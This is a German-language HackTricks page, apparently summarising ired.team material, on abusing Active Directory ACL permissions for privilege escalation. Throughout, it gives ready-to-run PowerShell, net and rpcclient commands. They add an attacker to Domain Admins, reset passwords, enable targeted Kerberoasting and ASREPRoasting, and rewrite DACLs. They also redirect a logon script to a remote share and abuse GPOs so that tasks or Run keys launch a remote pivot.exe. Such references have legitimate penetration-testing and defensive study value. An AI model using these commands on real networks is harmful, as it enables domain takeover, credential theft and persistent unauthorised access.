# Missbrauch von Active Directory ACLs/ACEs

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Finden Sie die wichtigsten Sicherheitslücken, damit Sie sie schneller beheben können. Intruder verfolgt Ihre Angriffsfläche, führt proaktive Bedrohungsscans durch und findet Probleme in Ihrer gesamten Technologie-Stack, von APIs über Webanwendungen bis hin zu Cloud-Systemen. [**Probieren Sie es noch heute kostenlos aus**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks).

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

**Diese Seite ist größtenteils eine Zusammenfassung der Techniken von [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) und [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges). Für weitere Details lesen Sie die Originalartikel.**


## **GenericAll-Rechte für Benutzer**
Diese Berechtigung gewährt einem Angreifer die volle Kontrolle über ein Zielbenutzerkonto. Sobald die `GenericAll`-Rechte mit dem Befehl `Get-ObjectAcl` bestätigt wurden, kann ein Angreifer Folgendes tun:

- **Ändern des Passworts des Ziels**: Mit `net user <Benutzername> <Passwort> /domain` kann der Angreifer das Passwort des Benutzers zurücksetzen.
- **Gezieltes Kerberoasting**: Weisen Sie dem Benutzerkonto einen SPN zu, um es kerberoastbar zu machen, und verwenden Sie Rubeus und targetedKerberoast.py, um die Ticket-Granting-Ticket (TGT)-Hashes zu extrahieren und zu versuchen, sie zu knacken.
```powershell
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Gezieltes ASREPRoasting**: Deaktivieren Sie die Vorauthentifizierung für den Benutzer, sodass sein Konto anfällig für ASREPRoasting wird.
```powershell
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **GenericAll-Rechte auf Gruppe**
Diese Berechtigung ermöglicht es einem Angreifer, Gruppenmitgliedschaften zu manipulieren, wenn er `GenericAll`-Rechte auf eine Gruppe wie `Domain Admins` hat. Nachdem der Angreifer den eindeutigen Namen der Gruppe mit `Get-NetGroup` identifiziert hat, kann er Folgendes tun:

- **Sich selbst zur Domain Admins-Gruppe hinzufügen**: Dies kann über direkte Befehle oder die Verwendung von Modulen wie Active Directory oder PowerSploit erfolgen.
```powershell
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## **GenericAll / GenericWrite / Schreiben auf Computer/Benutzer**
Das Halten dieser Berechtigungen für ein Computerobjekt oder ein Benutzerkonto ermöglicht Folgendes:

- **Kerberos ressourcenbasierte eingeschränkte Delegation**: Ermöglicht die Übernahme eines Computerobjekts.
- **Schattenanmeldeinformationen**: Verwenden Sie diese Technik, um sich als Computer- oder Benutzerkonto auszugeben, indem Sie die Berechtigungen zum Erstellen von Schattenanmeldeinformationen ausnutzen.

## **WriteProperty auf Gruppe**
Wenn ein Benutzer das Recht `WriteProperty` für alle Objekte einer bestimmten Gruppe (z. B. `Domänen-Admins`) hat, kann er Folgendes tun:

- **Sich selbst zur Domänen-Admins-Gruppe hinzufügen**: Durch Kombination der Befehle `net user` und `Add-NetGroupUser` kann über diese Methode eine Privileg Eskalation innerhalb der Domäne erreicht werden.
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Selbst (Selbstmitgliedschaft) in der Gruppe**
Diese Berechtigung ermöglicht es Angreifern, sich selbst zu bestimmten Gruppen wie `Domänen-Admins` hinzuzufügen, indem sie Befehle verwenden, die die Gruppenmitgliedschaft direkt manipulieren. Mit der folgenden Befehlssequenz ist eine Selbsthinzufügung möglich:
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Selbstmitgliedschaft)**
Ein ähnliches Privileg, das es Angreifern ermöglicht, sich direkt zu Gruppen hinzuzufügen, indem sie Gruppeneigenschaften ändern, wenn sie das Recht `WriteProperty` für diese Gruppen haben. Die Bestätigung und Ausführung dieses Privilegs erfolgt mit:
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**
Das Halten des `ExtendedRight` für einen Benutzer für `User-Force-Change-Password` ermöglicht das Zurücksetzen von Passwörtern, ohne das aktuelle Passwort zu kennen. Die Überprüfung dieses Rechts und dessen Ausnutzung kann über PowerShell oder alternative Befehlszeilentools erfolgen, die verschiedene Methoden zum Zurücksetzen des Passworts eines Benutzers bieten, einschließlich interaktiver Sitzungen und One-Liner für nicht-interaktive Umgebungen. Die Befehle reichen von einfachen PowerShell-Aufrufen bis zur Verwendung von `rpcclient` unter Linux und zeigen die Vielseitigkeit der Angriffsvektoren.
```powershell
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner auf Gruppe**
Wenn ein Angreifer feststellt, dass er `WriteOwner`-Rechte über eine Gruppe hat, kann er die Eigentümerschaft der Gruppe auf sich selbst ändern. Dies ist besonders gravierend, wenn es sich bei der betreffenden Gruppe um `Domain Admins` handelt, da durch die Änderung der Eigentümerschaft eine umfassendere Kontrolle über Gruppenattribute und Mitgliedschaft ermöglicht wird. Der Prozess umfasst die Identifizierung des richtigen Objekts über `Get-ObjectAcl` und anschließend die Verwendung von `Set-DomainObjectOwner`, um den Eigentümer entweder über die SID oder den Namen zu ändern.
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite auf Benutzer**
Diese Berechtigung ermöglicht es einem Angreifer, Benutzereigenschaften zu ändern. Mit der `GenericWrite`-Zugriffsberechtigung kann der Angreifer den Anmelde-Skriptpfad eines Benutzers ändern, um beim Benutzeranmelden ein bösartiges Skript auszuführen. Dies wird erreicht, indem der Befehl `Set-ADObject` verwendet wird, um die Eigenschaft `scriptpath` des Zielbenutzers auf das Skript des Angreifers zu verweisen.
```powershell
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite auf Gruppe**
Mit diesem Privileg können Angreifer die Gruppenmitgliedschaft manipulieren, indem sie sich selbst oder andere Benutzer zu bestimmten Gruppen hinzufügen. Dieser Prozess beinhaltet das Erstellen eines Anmeldeobjekts, das Verwenden dieses Objekts, um Benutzer zu einer Gruppe hinzuzufügen oder daraus zu entfernen, und das Überprüfen der Änderungen der Mitgliedschaft mit PowerShell-Befehlen.
```powershell
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**
Das Besitzen eines AD-Objekts und das Vorhandensein von `WriteDACL`-Berechtigungen ermöglicht es einem Angreifer, sich `GenericAll`-Berechtigungen über das Objekt zu verschaffen. Dies wird durch ADSI-Manipulation erreicht, was eine vollständige Kontrolle über das Objekt und die Möglichkeit zur Änderung seiner Gruppenmitgliedschaften ermöglicht. Trotzdem bestehen Einschränkungen, wenn versucht wird, diese Berechtigungen mithilfe der `Set-Acl` / `Get-Acl`-Cmdlets des Active Directory-Moduls auszunutzen.
```powershell
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Replikation in der Domäne (DCSync)**
Der DCSync-Angriff nutzt spezifische Replikationsberechtigungen in der Domäne, um einen Domain Controller zu imitieren und Daten zu synchronisieren, einschließlich Benutzeranmeldeinformationen. Diese leistungsstarke Technik erfordert Berechtigungen wie `DS-Replication-Get-Changes`, die es Angreifern ermöglichen, sensible Informationen aus der AD-Umgebung ohne direkten Zugriff auf einen Domain Controller zu extrahieren.
[**Hier erfahren Sie mehr über den DCSync-Angriff.**](../dcsync.md)

## GPO-Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO-Delegation

Delegierter Zugriff zur Verwaltung von Gruppenrichtlinienobjekten (GPOs) kann erhebliche Sicherheitsrisiken darstellen. Wenn beispielsweise einem Benutzer wie `offense\spotless` die Rechte zur Verwaltung von GPOs delegiert werden, kann er Privilegien wie **WriteProperty**, **WriteDacl** und **WriteOwner** haben. Diese Berechtigungen können für bösartige Zwecke missbraucht werden, wie mit PowerView erkannt werden kann:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```

### GPO-Berechtigungen auflisten

Um fehlerhaft konfigurierte GPOs zu identifizieren, können die Cmdlets von PowerSploit verkettet werden. Dadurch können GPOs entdeckt werden, für die ein bestimmter Benutzer Berechtigungen zur Verwaltung hat:
```powershell
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```

**Computer mit einer bestimmten Richtlinie angewendet**: Es ist möglich, herauszufinden, auf welche Computer eine bestimmte GPO angewendet wird, um den Umfang möglicher Auswirkungen zu verstehen.
```powershell
Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}
```

**Richtlinien, die auf einen bestimmten Computer angewendet werden**: Um zu sehen, welche Richtlinien auf einem bestimmten Computer angewendet werden, können Befehle wie `Get-DomainGPO` verwendet werden.

**OU mit einer bestimmten Richtlinie angewendet**: Die Identifizierung von Organisationseinheiten (OUs), die von einer bestimmten Richtlinie betroffen sind, kann mit `Get-DomainOU` durchgeführt werden.

### Missbrauch von GPO - New-GPOImmediateTask

Fehlerhaft konfigurierte GPOs können ausgenutzt werden, um Code auszuführen, zum Beispiel durch das Erstellen einer sofortigen geplanten Aufgabe. Dies kann verwendet werden, um einen Benutzer zur lokalen Administratorengruppe auf betroffenen Maschinen hinzuzufügen und die Privilegien erheblich zu erhöhen:
```powershell
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy-Modul - Missbrauch von GPO

Das GroupPolicy-Modul ermöglicht bei Installation das Erstellen und Verknüpfen neuer GPOs sowie das Festlegen von Präferenzen wie Registrierungswerten zur Ausführung von Hintertüren auf betroffenen Computern. Diese Methode erfordert, dass die GPO aktualisiert wird und sich ein Benutzer am Computer anmeldet, um die Ausführung zu ermöglichen:
```powershell
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Missbrauch von GPO

SharpGPOAbuse bietet eine Methode, bestehende GPOs zu missbrauchen, indem Aufgaben hinzugefügt oder Einstellungen geändert werden, ohne neue GPOs erstellen zu müssen. Dieses Tool erfordert die Änderung bestehender GPOs oder die Verwendung von RSAT-Tools zum Erstellen neuer GPOs, bevor Änderungen angewendet werden können:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Erzwingen einer Richtlinienaktualisierung

GPO-Updates erfolgen in der Regel alle 90 Minuten. Um diesen Prozess zu beschleunigen, insbesondere nach der Implementierung einer Änderung, kann der Befehl `gpupdate /force` auf dem Zielcomputer verwendet werden, um eine sofortige Aktualisierung der Richtlinie zu erzwingen. Dieser Befehl stellt sicher, dass Änderungen an GPOs angewendet werden, ohne auf den nächsten automatischen Aktualisierungszyklus warten zu müssen.

### Unter der Haube

Bei der Überprüfung der geplanten Aufgaben für eine bestimmte GPO, wie z.B. die "Fehlkonfigurierte Richtlinie", kann die Hinzufügung von Aufgaben wie "evilTask" bestätigt werden. Diese Aufgaben werden durch Skripte oder Befehlszeilentools erstellt, die darauf abzielen, das Systemverhalten zu ändern oder Privilegien zu eskalieren.

Die Struktur der Aufgabe, wie sie in der XML-Konfigurationsdatei generiert durch `New-GPOImmediateTask` dargestellt wird, umreißt die Einzelheiten der geplanten Aufgabe - einschließlich des auszuführenden Befehls und seiner Auslöser. Diese Datei stellt dar, wie geplante Aufgaben in GPOs definiert und verwaltet werden und bietet eine Methode zur Ausführung beliebiger Befehle oder Skripte im Rahmen der Richtliniendurchsetzung.

### Benutzer und Gruppen

GPOs ermöglichen auch die Manipulation von Benutzer- und Gruppenmitgliedschaften auf Zielsystemen. Durch direkte Bearbeitung der Benutzer- und Gruppenrichtliniendateien können Angreifer Benutzer zu privilegierten Gruppen hinzufügen, wie z.B. der lokalen `administrators`-Gruppe. Dies ist durch die Delegation von GPO-Verwaltungsberechtigungen möglich, die die Änderung von Richtliniendateien zur Aufnahme neuer Benutzer oder zur Änderung von Gruppenmitgliedschaften erlaubt.

Die XML-Konfigurationsdatei für Benutzer und Gruppen zeigt, wie diese Änderungen umgesetzt werden. Durch das Hinzufügen von Einträgen zu dieser Datei können bestimmten Benutzern erhöhte Privilegien auf betroffenen Systemen gewährt werden. Diese Methode bietet einen direkten Ansatz zur Privilegieneskalation durch die Manipulation von GPOs.

Darüber hinaus können auch zusätzliche Methoden zur Ausführung von Code oder zur Aufrechterhaltung der Persistenz in Betracht gezogen werden, wie z.B. die Nutzung von Anmelde-/Abmelde-Skripten, die Änderung von Registrierungsschlüsseln für Autoruns, die Installation von Software über .msi-Dateien oder die Bearbeitung von Dienstkonfigurationen. Diese Techniken bieten verschiedene Möglichkeiten, den Zugriff auf Ziel-Systeme aufrechtzuerhalten und zu kontrollieren, indem GPOs missbraucht werden.

## Referenzen

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://wald0.com/?p=112](https://wald0.com/?p=112)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
* [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Finden Sie die wichtigsten Sicherheitslücken, damit Sie sie schneller beheben können. Intruder überwacht Ihre Angriffsfläche, führt proaktive Bedrohungsscans durch und findet Probleme in Ihrer gesamten Technologie-Stack, von APIs über Webanwendungen bis hin zu Cloud-Systemen. [**Probieren Sie es noch heute kostenlos aus**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks).

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>Lernen Sie das Hacken von AWS von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
